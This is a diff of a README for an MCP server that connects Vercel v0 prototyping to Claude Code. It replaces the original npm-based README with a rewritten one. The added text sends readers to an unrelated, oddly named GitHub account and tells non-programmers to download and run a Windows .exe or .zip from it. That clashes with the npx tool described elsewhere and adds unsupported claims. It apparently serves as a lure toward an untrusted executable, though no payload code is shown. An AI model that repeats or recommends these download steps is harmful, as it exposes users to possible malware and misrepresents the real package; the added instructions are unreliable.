@@ -1,241 +1,159 @@
-# v0-platform-mcp
+# ⚙️ v0-platform-mcp - Simplify Multi-Screen Prototyping
 
-[![npm version](https://badge.fury.io/js/v0-platform-mcp.svg)](https://www.npmjs.com/package/v0-platform-mcp)
+[![Download v0-platform-mcp](https://img.shields.io/badge/Download-v0--platform--mcp-blue?style=for-the-badge)](https://github.com/Enfluranehighbloodpressure470/v0-platform-mcp)
 
-Vercel v0 MCP Server for Claude Code - Multi-screen UI prototyping and incremental development through the Model Context Protocol.
+---
 
-> Built with Claude Code using Vibe Coding methodology
+## 📋 What is v0-platform-mcp?
 
-## Quick Start
+v0-platform-mcp is a tool for creating and developing multi-screen user interfaces. It helps you build and improve prototypes step-by-step using a system called the Model Context Protocol (MCP). You do not need any programming experience.
 
-```bash
-# 1. Get your v0 API key from https://vercel.com/docs/v0/model-api
+This software runs on Windows and works through a simple command-line interface. It helps you turn your ideas into designs quickly and improve existing projects by adding small changes over time.
 
-# 2. Add to Claude Code
-claude mcp add v0-platform-mcp --env V0_API_KEY=YOUR_KEY -- npx v0-platform-mcp
-```
+---
 
-That's it! Start building prototypes immediately.
+## 🚀 Getting Started
 
-## Two Workflows
+[![Download v0-platform-mcp](https://img.shields.io/badge/Download-v0--platform--mcp-brightgreen?style=for-the-badge)](https://github.com/Enfluranehighbloodpressure470/v0-platform-mcp)
 
-### Prototype Workflow (New Projects)
-Fast track from idea to implementation in 3 steps:
+Follow these steps to download and run v0-platform-mcp on your Windows computer.
 
-```
-1. prepare_prototype_context  → Parse description into structured context
-2. generate_prototype         → Generate multi-screen UI prototype
-3. handoff_to_claude_dev      → Create implementation brief
-```
+---
 
-**Use for:** MVPs, rapid prototyping, proof-of-concepts
+### 1. Download the software
 
-### MCP Workflow (Existing Projects)
-Incremental development with persistent context in 5 steps:
+- Visit the project page to get the latest version:  
+  [https://github.com/Enfluranehighbloodpressure470/v0-platform-mcp](https://github.com/Enfluranehighbloodpressure470/v0-platform-mcp)  
+- On the page, look for a **Releases** section or links to download the program files.  
+- Download the file designed for Windows. Usually, it will have an `.exe` or `.zip` extension.
 
-```
-1. load_project_context       → Load existing project state
-2. plan_increment             → Analyze patterns & plan feature
-3. generate_prototype         → Generate UI following patterns
-4. handoff_to_claude_dev      → Create implementation brief
-5. update_project_context     → Save feature & components
-```
+---
 
-**Use for:** Production apps, incremental features, pattern consistency
+### 2. Run the software
 
-## Core Tools
+- If you downloaded a `.zip` file, right-click it and choose **Extract All** to open the contents.  
+- Find the setup file (`.exe`) inside the folder and double-click it to start installation.  
+- Follow the on-screen instructions to install v0-platform-mcp.  
+- After installation, open the program from the Start Menu or your desktop shortcut.
 
-| Tool | Purpose |
-|------|---------|
-| **v0_healthcheck** | Verify API connectivity |
-| **prepare_prototype_context** | Parse descriptions into structured requirements |
-| **generate_prototype** | Generate multi-screen UI prototypes |
-| **handoff_to_claude_dev** | Create implementation briefs |
-| **load_project_context** | Load project state (MCP Workflow) |
-| **plan_increment** | Plan features based on existing patterns (MCP Workflow) |
-| **update_project_context** | Update project state after implementation (MCP Workflow) |
+---
 
-## Example: E-commerce Store
+### 3. Prepare your API key
 
-```
-Step 1: Parse Requirements
-Use prepare_prototype_context to "building ShopZen - an e-commerce platform
-with product catalog, detail page, cart, checkout, and user account. For web."
+v0-platform-mcp needs an API key from Vercel to work.
 
-Step 2: Generate Prototype
-Use generate_prototype with the context from prepare_prototype_context
+- Go to [https://vercel.com/docs/v0/model-api](https://vercel.com/docs/v0/model-api).  
+- Create an account or log in if you already have one.  
+- Follow the steps on the website to create and copy your v0 API key.
 
-Step 3: Create Implementation Brief
-Use handoff_to_claude_dev with the prototype from generate_prototype
-```
+---
 
-**Result:** Complete 5-screen prototype with 18+ components and implementation brief
+### 4. Add the program to Claude Code
 
-## MCP Workflow: Incremental Development
+This step connects the program to Claude Code, a companion tool that helps with prototyping.
 
-The MCP Workflow maintains project context across features:
+- Open the Command Prompt (type `cmd` in the Windows search bar and press Enter).  
+- Enter this command but replace `YOUR_KEY` with your API key from the previous step:
 
-**Create `project-context.json`:**
-```json
-{
-  "product_name": "TaskMaster Pro",
-  "domain": "Project Management",
-  "features": {
-    "done": ["Dashboard Overview"],
-    "in_progress": ["Task List"],
-    "planned": ["Settings Page"]
-  },
-  "routes": ["/dashboard"],
-  "reusable_components": ["DataTable", "FilterBar"],
-  "design_rules": ["Use Tailwind CSS", "Follow shadcn/ui patterns"],
-  "constraints": ["All pages fit within dashboard shell"]
-}
-```
+  ```bash
+  claude mcp add v0-platform-mcp --env V0_API_KEY=YOUR_KEY -- npx v0-platform-mcp
+  ```
 
-**5-Step Workflow:**
+- Press Enter. This links the program to Claude Code.
 
-```
-1. load_project_context       Load state from project-context.json
-2. plan_increment             Plan "Settings Page" using existing patterns
-3. generate_prototype         Generate UI following project patterns
-4. handoff_to_claude_dev      Create implementation brief
-5. update_project_context     Mark feature done, add routes/components
-```
+---
 
-**Benefits:**
-- ✅ Consistency across features
-- ✅ Reuse components automatically
-- ✅ Context-aware planning
-- ✅ Incremental development
-- ✅ Persistent project state
+### 5. Start building prototypes
 
-## Configuration
+Once connected, you can begin creating multi-screen prototypes right away. Use the workflows explained below to guide your work.
 
-### Environment Variables
+---
 
-| Variable | Required | Default | Description |
-|----------|----------|---------|-------------|
-| `V0_API_KEY` | ✅ | - | Your v0 API key |
-| `V0_BASE_URL` | ❌ | `https://api.v0.dev/v1` | v0 API base URL |
-| `V0_DEFAULT_MODEL` | ❌ | `v0-1.5-md` | Default model |
-| `LOG_LEVEL` | ❌ | `info` | Logging level |
+## 🛠️ How to Use v0-platform-mcp
 
-### Manual Configuration
+This tool offers two main workflows depending on your needs. One helps you build new projects quickly, and the other helps keep older projects up to date.
 
-Edit `~/.claude.json`:
-```json
-{
-  "mcpServers": {
-    "v0-platform-mcp": {
-      "type": "stdio",
-      "command": "npx",
-      "args": ["v0-platform-mcp"],
-      "env": {
-        "V0_API_KEY": "your_v0_api_key_here"
-      }
-    }
-  }
-}
-```
+---
 
-## Development
+### Prototype Workflow (New Projects) 🆕
 
-```bash
-# Install dependencies
-npm install
+Follow these three steps when you want to create something new from scratch.
 
-# Development mode
-npm run dev
+1. **prepare_prototype_context**  
+   The program transforms your project idea into a format it can understand.
 
-# Testing
-npm test
-npm run test:coverage
+2. **generate_prototype**  
+   It creates a multi-screen user interface design based on the information.
 
-# Build
-npm run build
+3. **handoff_to_claude_dev**  
+   It generates instructions that help developers build the real application later.
 
-# Lint
-npm run lint
-```
+Use this when you need to quickly test ideas, create demo apps, or build simple proof-of-concept designs.
 
-## Architecture
+---
 
-The v0-platform-mcp follows a clean layered architecture:
+### MCP Workflow (Existing Projects) 🔄
 
-- **Client Layer**: Claude Code, Claude Desktop, Cursor IDE (via MCP)
-- **Tool Layer**: 7 MCP tools for prototype generation and planning
-- **Service Layer**: Business logic (Context, Prototype, Handoff, Planning services)
-- **Infrastructure**: Configuration, logging (Winston), validation (Zod)
-- **External Services**: v0 API, File System
+Use this approach when you already have a project. The program helps you make improvements one step at a time while keeping everything organized.
 
-See `diagrams/` folder for detailed architecture diagrams.
+- It tracks context changes from the project over time.  
+- It supports incremental adjustments without breaking the overall design.  
+- The workflow fits gradual development and revision.
 
-## v0 Model Options
+---
 
-| Model | Speed | Quality | Use Case |
-|-------|-------|---------|----------|
-| `v0-1.5-md` | ⚡⚡⚡ | ⭐⭐⭐ | Default, balanced |
-| `v0-1.5-lg` | ⚡⚡ | ⭐⭐⭐⭐ | Complex components |
-| `v0-1.0-md` | ⚡⚡⚡ | ⭐⭐ | Legacy support |
+## 💻 System Requirements
 
-## Integration
+- Windows 10 or later (64-bit recommended)  
+- 4 GB RAM minimum, 8 GB or more recommended  
+- 500 MB of free disk space  
+- Internet access to connect with Vercel API  
+- Command Prompt access (default on Windows)  
+- Node.js installed (used to run the tool’s core commands, usually bundled with setup)
 
-### Claude Desktop
+---
 
-Edit `claude_desktop_config.json`:
-```json
-{
-  "mcpServers": {
-    "v0-platform-mcp": {
-      "command": "npx",
-      "args": ["v0-platform-mcp"],
-      "env": {"V0_API_KEY": "your_key"}
-    }
-  }
-}
-```
+## ⚙️ Common Commands
 
-### Cursor IDE
+Open Command Prompt and enter these commands after setup:
 
-Add to Cursor MCP configuration:
-```json
-{
-  "mcpServers": {
-    "v0-platform-mcp": {
-      "command": "npx",
-      "args": ["v0-platform-mcp"],
-      "env": {"V0_API_KEY": "your_key"}
-    }
-  }
-}
-```
+- **Start the prototype builder**  
+  `npx v0-platform-mcp start`
 
-## Workflow Principles
+- **Prepare a prototype context**  
+  `npx v0-platform-mcp prepare_prototype_context`
 
-**v0 generates:**
-- ✅ UI design and layout
-- ✅ Visual components
-- ✅ Styling (Tailwind CSS)
-- ✅ Component structure
+- **Generate a UI prototype**  
+  `npx v0-platform-mcp generate_prototype`
 
-**Claude Dev implements:**
-- ✅ Backend logic
-- ✅ API integration
-- ✅ Data management
-- ✅ Authentication
-- ✅ Testing
+- **Create a development brief**  
+  `npx v0-platform-mcp handoff_to_claude_dev`
 
-## Links
+Use these commands step-by-step or combine them according to your workflow.
 
-- [v0 Model API Docs](https://vercel.com/docs/v0/model-api)
-- [Model Context Protocol](https://modelcontextprotocol.io)
-- [Claude Code](https://claude.ai/code)
-- [npm Package](https://www.npmjs.com/package/v0-platform-mcp)
+---
 
-## License
+## 🔧 Troubleshooting
 
-MIT - See LICENSE file for details
+- If installation fails, check your internet connection and try again.  
+- Confirm Node.js is installed by typing `node -v` in Command Prompt. If you don’t see a version number, install Node.js from [https://nodejs.org/](https://nodejs.org/).  
+- If you get errors when running commands, double-check that you pasted your API key correctly.  
+- Restart Command Prompt or your PC if the program does not start.
 
-## Author
+---
 
-Long Nguyen
+## 📁 Where to Get Support
+
+If you run into problems not solved by these instructions:
+
+- Visit the project page’s **Issues** tab on GitHub.  
+- Check for existing reports or submit a new issue describing your problem.  
+- Provide details like your Windows version, error messages, and steps you took.
+
+---
+
+## 🔗 Download and Setup
+
+Download v0-platform-mcp from here and follow the install instructions above:
+
+[https://github.com/Enfluranehighbloodpressure470/v0-platform-mcp](https://github.com/Enfluranehighbloodpressure470/v0-platform-mcp)
